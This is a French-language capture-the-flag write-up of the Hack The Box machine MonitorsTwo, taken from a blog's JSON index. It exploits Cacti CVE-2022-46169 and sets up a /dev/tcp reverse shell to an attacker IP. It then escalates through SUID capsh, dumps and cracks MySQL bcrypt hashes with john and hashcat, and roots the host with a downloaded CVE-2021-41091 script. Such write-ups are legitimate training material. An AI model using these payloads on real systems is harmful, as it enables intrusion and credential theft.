
[{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"\rI- Vue d\u0026rsquo;ensemble de la machine: #\rMonitorsTwo est une machine Linux de difficulté facile. Elle met en avant quelques vulnérabilités et erreurs de configurations qui seront exploitées afin de prendre le contrôle du système suivant notre kill-chain ci-après:\nAccès Initial:\nUne première énumeration rapide nous permet de découvrir une application web vulnérable à une exécution de code à distance (RCE) avec pré-authentification via un en-tête X-Forwarded-For malveillant. L\u0026rsquo;exploitation de cette vulnérabilité débouche sur un shell au sein d\u0026rsquo;un conteneur Docker.\nÉlevation de privilèges (1): Un binaire capsh mal configuré avec le bit SUID activé permet un accès root à l\u0026rsquo;intérieur du conteneur.\nMouvement latéral: La découverte d\u0026rsquo;identifiants MySQL permet le dumping d\u0026rsquo;un hash, qui, une fois craqué, fournit un accès SSH à la machine.\nÉlevation de privilèges (2): Une énumération plus poussée révèle une version de Docker vulnérable qui permet à un utilisateur de faible privilège d\u0026rsquo;accéder aux systèmes de fichiers des autres conteneurs montés. En tirant parti de l\u0026rsquo;accès root dans le conteneur, un binaire bash avec le bit SUID activé sera copié, afin d\u0026rsquo;obtenir une élévation de privilèges sur l\u0026rsquo;hôte.\nII- Collecte d\u0026rsquo;informations: #\rScan de ports Nmap #\r┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo] └─$sudo nmap -sS -A -Pn --min-rate 10000 -p- 10.10.11.211 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Login to Cacti |_http-server-header: nginx/1.18.0 (Ubuntu) Informations utiles:\nServeur web nginx 1.18.0 en écoute, pouvant être un portail de connexion. Serveur SSH en mode écoute (nous auront besoin d\u0026rsquo;identifiants valides pour y accéder). III- Accès Initial #\rPage d\u0026rsquo;accueil :\nNous avons la version de l\u0026rsquo;application Cacti 1.2.22 il s\u0026rsquo;agira donc de chercher l\u0026rsquo;existence de vulnérabilités connues sur cette version:\nIl en ressort plusieurs références pour la même vulnérabilité de type RCE: CVE-2022-46169\nVulnérabilité: L\u0026rsquo;exploit consiste à accéder à l\u0026rsquo;endpoint vulnérable /remote_agent.php, dont l\u0026rsquo;authentification peut être contournée en raison d\u0026rsquo;une implémentation faible de la fonction get_client_addr qui utilise un en-tête contrôlé par l\u0026rsquo;utilisateur, nommément X-Forwarded-For, pour authentifier le client. Une fois que cette vérification initiale est contournée, nous déclencherons ensuite la fonction poll_for_data via l\u0026rsquo;action polldata, qui est vulnérable à l\u0026rsquo;injection de commande via le paramètre $poller_id qui est passé à proc_open, qui est une fonction PHP qui exécute des commandes système.\nEssayons donc ce PoC:\n# Nous allons configurer un listenner notament nc: ┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo] └─$ nc -lvnp 1337 listening on [any] 1337 ... # clonage du repo github: ┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo] └─$ sudo git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22 Cloning into \u0026#39;CVE-2022-46169-CACTI-1.2.22\u0026#39;... remote: Enumerating objects: 18, done. remote: Counting objects: 100% (18/18), done. remote: Compressing objects: 100% (16/16), done. remote: Total 18 (delta 4), reused 4 (delta 1), pack-reused 0 Receiving objects: 100% (18/18), 5.07 KiB | 2.53 MiB/s, done. Resolving deltas: 100% (4/4), done. ┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo/CVE-2022-46169-CACTI-1.2.22] └─$ cd CVE-2022-46169-CACTI-1.2.22/ ┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo/CVE-2022-46169-CACTI-1.2.22] └─$ python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.xx.xx --LPORT=1337 Checking... The target is vulnerable. Exploiting... Bruteforcing the host_id and local_data_ids Bruteforce Success!! # Obtention du reverse shell: ┌──(raizen㉿Raizen)-[~] └─$ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.xx.xx] from (UNKNOWN) [10.10.11.211] 39056 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@50bca5e748b0:/var/www/html$ Simple et efficace !\nIV- Élevation de privilèges (1) #\rAprès avoir examiné divers répertoires et fichiers, rien de particulièrement intéressant n\u0026rsquo;est apparu. La seule chose à noter est que nous sommes actuellement dans un conteneur Docker, comme le suggère la présence du fichier /.dockerenv, ce qui est également confirmé par notre nom d\u0026rsquo;hôte, à savoir www-data@50bca5e748b0:\nwww-data@50bca5e748b0:/var/www/html$ ls -la / total 88 drwxr-xr-x 1 root root 4096 Mar 21 2023 . drwxr-xr-x 1 root root 4096 Mar 21 2023 .. -rwxr-xr-x 1 root root 0 Mar 21 2023 .dockerenv drwxr-xr-x 1 root root 4096 Mar 22 2023 bin Nous pouvons vérifier s\u0026rsquo;il y a quelque chose d\u0026rsquo;intéressant qui peut être exécuté avec des privilèges élevés notament tous les fichiers sur le système de fichiers qui ont l\u0026rsquo;attribut setuid (suid) activé.\nwww-data@50bca5e748b0:/var/www/html$ find / -type f -perm -u=s 2\u0026gt;/dev/null find / -type f -perm -u=s 2\u0026gt;/dev/null /usr/bin/gpasswd /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /sbin/capsh /bin/mount /bin/umount /bin/su Le binaire capsh semble convenir à ce que je cherche. En effectuant une recherche rapide sur GTFOBins (un site incontournable qui répertorie une liste de binaires Unix pouvant être utilisés pour contourner les restrictions de sécurité locale dans des systèmes mal configurés) nous obtenons ceci :\nSuivons donc les directives de GTFOBins :\nwww-data@50bca5e748b0:/var/www$ /sbin/capsh --gid=0 --uid=0 -- /sbin/capsh --gid=0 --uid=0 -- id uid=0(root) gid=0(root) groups=0(root),33(www-data) Et ainsi j\u0026rsquo;obtiens les droits root. Cependant nous n\u0026rsquo;avons pas encore trouvé notre flag puisse que nous sommes toujours dans le conteneur docker.\nV- Mouvement latérral #\rLorsque nous listons les fichiers dans le répertoire racine (/), nous voyons un script appelé entrypoint.sh:\nls -l total 76 drwxr-xr-x 1 root root 4096 Mar 22 2023 bin drwxr-xr-x 2 root root 4096 Mar 22 2023 boot drwxr-xr-x 5 root root 340 Jan 25 14:34 dev -rw-r--r-- 1 root root 648 Jan 5 2023 entrypoint.sh \u0026lt;SNIP\u0026gt; Vérifions donc son contenu:\nwww-data@50bca5e748b0:/$ cat entrypoint.sh #!/bin/bash set -ex wait-for-it db:3306 -t 300 -- echo \u0026#34;database is connected\u0026#34; if [[ ! $(mysql --host=db --user=root --password=root cacti -e \u0026#34;show tables\u0026#34;) =~ \u0026#34;automation_devices\u0026#34; ]]; then mysql --host=db --user=root --password=root cacti \u0026lt; /var/www/html/cacti.sql mysql --host=db --user=root --password=root cacti -e \u0026#34;UPDATE user_auth SET must_change_password=\u0026#39;\u0026#39; WHERE username = \u0026#39;admin\u0026#39;\u0026#34; mysql --host=db --user=root --password=root cacti -e \u0026#34;SET GLOBAL time_zone = \u0026#39;UTC\u0026#39;\u0026#34; fi chown www-data:www-data -R /var/www/html # first arg is `-f` or `--some-option` if [ \u0026#34;${1#-}\u0026#34; != \u0026#34;$1\u0026#34; ]; then set -- apache2-foreground \u0026#34;$@\u0026#34; fi exec \u0026#34;$@\u0026#34; Nous voyons plusieurs commandes mysql exécutées en tant que root. Le script révèle également que le nom d\u0026rsquo;utilisateur admin existe et que le champ lié au mot de passe must_change_password est présent dans la table user_auth.\n$ mysql --host=db --user=root --password=root cacti -e \u0026#34;SELECT * FROM user_auth\u0026#34; id username password realm full_name email_address must_change_password password_change show_tree show_list show_preview graph_settings login_opts policy_graphs policy_trees policy_hosts policy_graph_templates enabled lastchange lastlogin password_history locked failed_attempts lastfail reset_perms 1 admin $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC 0 Jamie Thompson admin@monitorstwo.htb 1 on on on on on 2 11 1 1 on -1 -1 -1 0 0 663348655 3 guest 43e9a4ab75570f5b 0 Guest Account on on on on on 3 1 1 1 1 1 -1 -1-1 0 0 0 4 marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 0 Marcus Brune marcus@monitorstwo.htb on on on on 1 11 1 1 on -1 -1 on 0 0 2135691668 Nous obtenons ainsi les identifiants des utilisateurs admin et marcus :\nadmin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C Essayons de cracker ces identifiants sur notre machine d\u0026rsquo;attaque en utilisant john:\n┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo] └─$ cat hashes.txt $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C ┌──(raizen㉿Raizen)-[~] └─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 16 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status funkymonkey (?) Ainsi nous avons les identifiants de marcus:funkymonkey.Il ne reste plus qu\u0026rsquo;àeaayer de se connecter via ssh à notre cible et obtenir notre premier flag:\n┌──(marcus㉿monitorstwo)-[~] └─$ssh marcus@10.10.11.211 ┌──(marcus㉿monitorstwo)-[~] └─$ cat user.txt \u0026lt;********************************\u0026gt; VI- Élevation de privilèges (2) #\rAprès fait le tour des répertoires et fichiers, nous trouvons finallement quelque chose d\u0026rsquo;intéressant :\n┌──(marcus㉿monitorstwo)-[/var] └─$ cat mail/marcus From: administrator@monitorstwo.htb To: all@monitorstwo.htb Subject: Security Bulletin - Three Vulnerabilities to be Aware Of Dear all, We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible. CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability. CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability. CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed. We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department. Best regards, Administrator CISO Monitor Two Security Team En gros ce mail écrit par l\u0026rsquo;administrateur de monitorstwo.htb est destinée à tous les utilisateurs du système et aborde principalement trois vulnérabilités récemment découvertes qui nécessitent une attention immédiate. Nous alllons donc investiguer ces trois vulns et voir s\u0026rsquo;il y en a un que nous pourrons exploiter pour avancer dans notre tâche.\nLa première, CVE-2021-33033 concerne les versions du noyau antérieures à 5.11.14, voyons donc ce que nous avons actuellement : marcus@monitorstwo:/var$ uname -a Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux Bien que cela semble être une version obsolète, la série de versions 5.4 est en fait la dernière selon la documentation officielle:\nLa seconde CVE-2020-25706 fait référence à une vulnérabilité XSS pour Cacti 1.2.13 or la version de l\u0026rsquo;application cible est Cacti 1.2.22. -Il ne nous reste que la dernière vuln : CVE-2021-41091, qui concerne le Docker engine, nommé Moby version 20.10.9. Ce qui nous arrangerait compte tenu de l\u0026rsquo;environnement où nous somme actuellement.\nUne vérification de la version de docker nous permet de voir qu\u0026rsquo;il s\u0026rsquo;agit de la version 20.10.5 qui est spoiller alert vulnérable:\n┌──(marcus㉿monitorstwo)-[/var] └─$ docker --version Docker version 20.10.5+dfsg1, build 55c4c88 Nous devrions donc pouvoir exploiter ce CVE. Après quelques recherches, nous tombons sur ce POC.\nVulnérabilité: Plusieurs répertoires dans /var/lib/docker, qui sont montés et utilisés par les conteneurs Docker, sont accessibles aux utilisateurs à faible privilèges. Cela implique que si un attaquant obtient l\u0026rsquo;accès root à l\u0026rsquo;intérieur d\u0026rsquo;un conteneur, il pourrait créer des fichiers SUID arbitraires avec lesquels un utilisateur non privilégié à l\u0026rsquo;extérieur du conteneur pourrait interagir et utiliser pour une élevation de privilèges.\nCe que nous devons donc faire :\n1- Répéter notre processus initial pour obtenir un accès RCE et une élévation de privilèges via le binaire capsh en utilisant CVE-2022-46169.\n2- Attribuer les permissions appropriées au binaire bash avec la commande chmod u+s /bin/bash.\n3- Cloner le PoC du CVE-2021-41091 sur notre machine d\u0026rsquo;attaque, transférer le script bash (exp.sh) sur la cible en utilisant le compte marcus via SSH, et l\u0026rsquo;exécuter en utilisant l\u0026rsquo;utilisateur marcus.\nRépétons notre accès initial puis obtenons les droits root à l\u0026rsquo;intérieur du conteneur :\n# obtention des droits root à l\u0026#39;intérieur du conteneur whoami root id uid=0(root) gid=0(root) groups=0(root),33(www-data) # attribution des permissions SUID au binaire bash chmod u+s /bin/bash Depuis notre machine d\u0026rsquo;attaque :\n```bash\r# clonage du repo vers ma machine\r$ sudo git clone https://github.com/UncleJ4ck/CVE-2021-41091\r[sudo] password for kali:\rCloning into 'CVE-2021-41091'...\rremote: Enumerating objects: 25, done.\rremote: Counting objects: 100% (25/25), done.\rremote: Compressing objects: 100% (23/23), done.\rremote: Total 25 (delta 6), reused 3 (delta 0), pack-reused 0\rReceiving objects: 100% (25/25), 6.95 KiB | 6.96 MiB/s, done.\rResolving deltas: 100% (6/6), done.\r# move within the directory\r$ cd CVE-2021-41091/\r# checking permissions\r$ ls -l\rtotal 8\r-rwxr-xr-x 1 root root 2446 Jan 25 18:18 exp.sh\r-rw-r--r-- 1 root root 2616 Jan 25 18:18 README.md\r# start a Python HTTP server\r$ python3 -m http.server\rServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\r10.10.11.211 - - [25/Jan/2024 18:19:47] \u0026quot;GET /exp.sh HTTP/1.1\u0026quot; 200 -\r```\rDepuis le terminal de marcus:\n# Téléchargement du script ┌──(marcus㉿monitorstwo)-[~] └─$ wget http://10.10.xx.xx:8000/exp.sh --2024-01-25 18:19:47-- http://10.10.xx.xx:8000/exp.sh Connecting to 10.10.14.33:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 2446 (2.4K) [text/x-sh] Saving to: ‘exp.sh’ exp.sh 100%[========================\u0026gt;] 2.39K --.-KB/s in 0s 2024-01-25 18:19:47 (356 MB/s) - ‘exp.sh’ saved [2446/2446] # Attribution de la permission d\u0026#39;exécution\r┌──(marcus㉿monitorstwo)-[~]\r└─$ chmod +x exp.sh # Vérification des permissions\r┌──(marcus㉿monitorstwo)-[~]\r└─$ ls -l exp.sh\rtotal 8\r-rwxrwxr-x 1 marcus marcus 2446 Jan 25 18:18 exp.sh # Exécution du script\r┌──(marcus㉿monitorstwo)-[/var]\r└─$ ./exp.sh\r[!] Vulnerable to CVE-2021-41091\r[!] Now connect to your Docker container that is accessible and obtain root access !\r[\u0026gt;] After gaining root access execute this command (chmod u+s /bin/bash)\rDid you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes\r[!] Available Overlay2 Filesystems:\r/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\r/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r[!] Iterating over the available Overlay2 filesystems !\r[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\r[x] Could not get root access in \u0026#39;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\u0026#39;\r[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r[!] Rooted !\r[\u0026gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r[?] If it didnt spawn a shell go to this path and execute \u0026#39;./bin/bash -p\u0026#39;\r[!] Spawning Shell\rbash-5.1# exit Direction vers le \u0026ldquo;Current Vulnerable Path\u0026rdquo; mentionné ci-dessus ┌──(marcus㉿monitorstwo)-[~]\r└─$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r# Éxécution de la commande \u0026#39;./bin/bash -p\u0026#39; pour lancer l\u0026#39;interpréteur en ``privileged mode``\r$ ./bin/bash -p\rbash-5.1# id\ruid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)\rbash-5.1# cat /root/root.txt\r\u0026lt;********************************\u0026gt; Pwned ✅ #\rAinsi s\u0026rsquo;achève notre aventure ;) VII- Extra - IppSec’s Exploit #\rCette section est une ouverture et sera basé sur la vidéo de IppSec\u0026rsquo;s video walkthrough où l\u0026rsquo;exploitation est réalisé de façon manuelle. Tout simplement le goat des writups. On apprend toujours de nouvelles méthodologies et astuces dans ses vidéos donc ça vaut le détour.\nAccès Initial #\rNous réaliser l\u0026rsquo;exploitation du CVE-2022-46169 en se basant sur le post de Rapid7) de façon manuelle:\nSi les paramètres LOCAL_DATA_ID et/ou HOST_ID ne sont pas définis, le module tentera de forcer la valeur (ou les valeurs) manquante(s). Si une combinaison valide est trouvée, le module utilisera ces valeurs pour tenter l\u0026rsquo;exploitation. Si LOCAL_DATA_ID et/ou HOST_ID sont tous les deux définis, le module tentera immédiatement l\u0026rsquo;exploitation. Pendant l\u0026rsquo;exploitation, le module envoie une requête GET à /remote_agent.php avec le paramètre d\u0026rsquo;action défini sur polldata et l\u0026rsquo;en-tête X-Forwarded-For défini sur la valeur fournie pour X_FORWARDED_FOR_IP (par défaut 127.0.0.1). WNous pouvons commencer par intercepter une requête via Burp, par exemple, une requête de connexion POST en utilisant des identifiants aléatoires, changer la méthode HTTP en requête GET et l\u0026rsquo;URL en /remote_agent.php?action=polldata\u0026amp;local_data_ids[]={local_data_ids}\u0026amp;host_id={host_id}\u0026amp;poller_id=1{payload}``.\nLe chemin d\u0026rsquo;URL peut être trouvé ici:\nNous recevons l\u0026rsquo;erreur FATAL: You are not authorized to use this service. Commençons par ajouter l\u0026rsquo;en-tête X-Forwarded-For avec la valeur localhost et voyons ce qui se passe.\nCette fois, nous n\u0026rsquo;avons pas reçu d\u0026rsquo;erreur FATAL, mais une erreur de Validation concernant le paramètre host_id. Supprimons les variables, définissons tous les identifiants sur 1, et essayons un payload simple, telle que sleep 5.\nLe payload sleep+5 est la version URL-encodée de la charge utile sleep 5.\nNous n\u0026rsquo;avons reçu aucune erreur en retour, mais la charge utile n\u0026rsquo;a pas fonctionné non plus. Cela est logique car, selon la description de la vulnérabilité :\nSi une combinaison valide est trouvée, le module utilisera ces informations pour tenter l\u0026rsquo;exploitation\nAinsi, nous devons effectuer une attaque par brute force sur les paramètres local_data_id et host_id jusqu\u0026rsquo;à ce que nous trouvions une combinaison valide de valeurs qui permettra à notre charge utile de fonctionner. Nous pouvons l\u0026rsquo;automatiser en utilisant l\u0026rsquo;outil Intruder :\nLes deux charges utiles 1 et 2 sont définies comme une liste séquentielle de nombres de 1 à 10\nIntruder montre qu\u0026rsquo;une seule combinaison de charges utiles a entraîné un délai de 5 secondes (causé par notre charge utile sleep+5) : local_data_ids[]=6 et host_id=1 ! Vérifions cela manuellement : Ce qui se passe ici, c\u0026rsquo;est que certaines valeurs du paramètre rdd_name de la réponse HTTP sont exploitables : uptime en est une (nous pouvons trouver la liste complète des paramètres exploitables ici. Donc, nous effectuons une attaque par force brute sur les paramètres local_data_id et host_id jusqu\u0026rsquo;à ce qu\u0026rsquo;une combinaison d\u0026rsquo;entre eux renvoie l\u0026rsquo;un des paramètres exploitables dans la réponse :\nMaintenant que nous avons trouvé la bonne combinaison de valeurs de paramètres, nous pouvons envoyer du code (ici un reverse shell) en tant que charge utile: bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.xx.xx/1337 0\u0026gt;\u0026amp;1'; L\u0026rsquo;encoder en URL (en appuyant sur CTRL+U) puis mettre en place sur notre machine d\u0026rsquo;attaque un Listener (netcat en mode écoute) et envoyer la requête :\n# listener nc ┌──(raizen㉿Raizen)-[~] └─$ nc -lnvp 1337 listening on [any] 1337 ... connect to [10.10.xx.xx] from (UNKNOWN) [10.10.xx.xx] 36722 # Obtention du shell inversé ┌──(raizen㉿Raizen)-[~] └─$ nc -lnvp 1337 listening on [any] 1337 ... connect to [10.10.xx.xx] from (UNKNOWN) [10.10.11.211] 36722 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@50bca5e748b0:/var/www/html$ Mouvement latéral #\rIdéalement, nous devrions d\u0026rsquo;abord stabiliser notre shell. Python n\u0026rsquo;est pas installé sur la cible, donc nous ne pouvons pas utiliser le module pty(python3 import pty;pty.spawn'(\u0026quot;/bin/bash\u0026quot;)') pour y parvenir. Cependant, nous pouvons utiliser script :\n# Stabilisation du shell avec script www-data@50bca5e748b0:/var/www/html$ which script which script /usr/bin/script www-data@50bca5e748b0:/var/www/html$ script -O /dev/null -q /bin/bash script -O /dev/null -q /bin/bash $ bash bash # Mise en arrière plan de la connexion www-data@50bca5e748b0:/var/www/html$ ^Z [1]+ Stopped nc -lvnp 1337 # Remise en avant plan dans notre shell ┌──(raizen㉿Raizen)-[~] └─$ stty raw -echo; fg nc -lvnp 1337 www-data@50bca5e748b0:/var/www/html$ Maintenant, nous devons obtenir les valeurs des variables rows(lignes) et cols(colonnes) depuis notre machine d\u0026rsquo;attaque :\n┌──(raizen㉿Raizen)-[~] └─$ stty -a speed 38400 baud; rows 51; columns 209; line = 0; intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = \u0026lt;undef\u0026gt;; eol2 = \u0026lt;undef\u0026gt;; swtch = \u0026lt;undef\u0026gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0; -parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc Et enfin, nous devons définir les mêmes valeurs sur notre machine cible :\nwww-data@50bca5e748b0:/var/www/html$ stty rows 51 cols 209 www-data@50bca5e748b0:/var/www/html$ export TERM=xterm Nous avons maintenant notre point d\u0026rsquo;entrée initial avec un shell bash approprié ! Étant donné que c\u0026rsquo;est un serveur d\u0026rsquo;application web, nous devrons probablement vérifier les fichiers de configuration de la base de données :\n# Recherche de fichiers de configuration www-data@50bca5e748b0:/var/www/html$ find . | grep config ./include/config.php ./docs/images/graphs-edit-nontemplate-configuration.png ./docs/apache_template_config.html # Recherche de chaînes de caractères liées à la base de données dans le fichier de configuration www-data@50bca5e748b0:/var/www/html$ grep database include/config.php * Make sure these values reflect your actual database/host/user/password $database_type = \u0026#39;mysql\u0026#39;; $database_default = \u0026#39;cacti\u0026#39;; $database_hostname = \u0026#39;db\u0026#39;; $database_username = \u0026#39;root\u0026#39;; $database_password = \u0026#39;root\u0026#39;; $database_port = \u0026#39;3306\u0026#39;; $database_retries = 5; $database_ssl = false; $database_ssl_key = \u0026#39;\u0026#39;; $database_ssl_cert = \u0026#39;\u0026#39;; $database_ssl_ca = \u0026#39;\u0026#39;; $database_persist = false; #$rdatabase_type = \u0026#39;mysql\u0026#39;; #$rdatabase_default = \u0026#39;cacti\u0026#39;; #$rdatabase_hostname = \u0026#39;localhost\u0026#39;; #$rdatabase_username = \u0026#39;cactiuser\u0026#39;; #$rdatabase_password = \u0026#39;cactiuser\u0026#39;; #$rdatabase_port = \u0026#39;3306\u0026#39;; #$rdatabase_retries = 5; #$rdatabase_ssl = false; #$rdatabase_ssl_key = \u0026#39;\u0026#39;; #$rdatabase_ssl_cert = \u0026#39;\u0026#39;; #$rdatabase_ssl_ca = \u0026#39;\u0026#39;; * Save sessions to a database for load balancing * are defined in lib/database.php Le fichier de configuration ci-dessus contient tout ce dont nous avons besoin pour nous connecter au serveur de base de données :\n# Connexion au serveur mysql www-data@50bca5e748b0:/var/www/html$ mysql -u root -proot -h db Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 221 Server version: 5.7.40 MySQL Community Server (GPL) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. # Listage des bases de données MySQL [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | cacti | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.002 sec) # Selection de la base de donnée: MySQL [(none)]\u0026gt; use cacti; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed # Listage des tables de bases de données MySQL [cacti]\u0026gt; show tables; +-------------------------------------+ | Tables_in_cacti | +-------------------------------------+ \u0026lt;SNIP\u0026gt; | user_auth | | user_auth_cache | | user_auth_group | | user_auth_group_members | | user_auth_group_perms | | user_auth_group_realm | | user_auth_perms | | user_auth_realm | | user_domains | | user_domains_ldap | | user_log | | vdef | | vdef_items | | version | +-------------------------------------+ 111 rows in set (0.001 sec) # Extraction de la première ligne de la table pour énumérer ses champs MySQL [cacti]\u0026gt; SELECT * FROM user_auth LIMIT 1 \\G; *************************** 1. row *************************** id: 1 username: admin password: $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC realm: 0 full_name: Jamie Thompson email_address: admin@monitorstwo.htb must_change_password: password_change: on show_tree: on show_list: on show_preview: on graph_settings: on login_opts: 2 policy_graphs: 1 policy_trees: 1 policy_hosts: 1 policy_graph_templates: 1 enabled: on lastchange: -1 lastlogin: -1 password_history: -1 locked: failed_attempts: 0 lastfail: 0 reset_perms: 663348655 1 row in set (0.000 sec) ERROR: No query specified -Nous pouvons déjà y trouver les information de connexion sur le compte ``admin`` # selection des champs qui nous intéressent (noms et mots de passe): MySQL [cacti]\u0026gt; SELECT username, password FROM user_auth ; +----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | admin | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC | | guest | 43e9a4ab75570f5b | | marcus | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C | +----------+--------------------------------------------------------------+ 3 rows in set (0.001 sec) Le modificateur \\G dans le client de ligne de commande MySQL.\nNous pouvons maintenant essayer de cracker ces hash sur notre machine en utilisant d\u0026rsquo;abord le mode de détection automatique de hashcat pour déterminer le type de hachage :\n┌──(raizen㉿Raizen)-[~] └─$ cat hashes admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C # En utilisant le mode d\u0026#39;auto detection ┌──(raizen㉿Raizen)-[~] └─$ hashcat hashes /usr/share/wordlists/rockyou.txt --username hashcat (v6.2.6) starting in autodetect mode \u0026lt;SNIP\u0026gt; The following 4 hash-modes match the structure of your input hash: # | Name | Category ======+============================================================+======================== 3200 | bcrypt $2*$, Blowfish (Unix) | Operating System 25600 | bcrypt(md5($pass)) / bcryptmd5 | Forums, CMS, E-Commerce 25800 | bcrypt(sha1($pass)) / bcryptsha1 | Forums, CMS, E-Commerce 28400 | bcrypt(sha512($pass)) / bcryptsha512 | Forums, CMS, E-Commerce Please specify the hash-mode with -m [hash-mode]. Started: Fri Jan 26 06:42:36 2024 Stopped: Fri Jan 26 06:42:38 2024 Nos hash commencent par $2y$, ce qui correspond mieux au format bcrypt de la category operating system. Nous choisirons donc le mode 3200 dans hashcat.\n┌──(raizen㉿Raizen)-[~] └─$ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --username \u0026lt;SNIP\u0026gt; $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =\u0026gt; s Session..........: hashcat Status...........: Running Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix)) Hash.Target......: hashes Time.Started.....: Fri Jan 26 06:46:23 2024 (7 mins, 57 secs) Time.Estimated...: Tue Jan 30 09:23:44 2024 (4 days, 2 hours) En 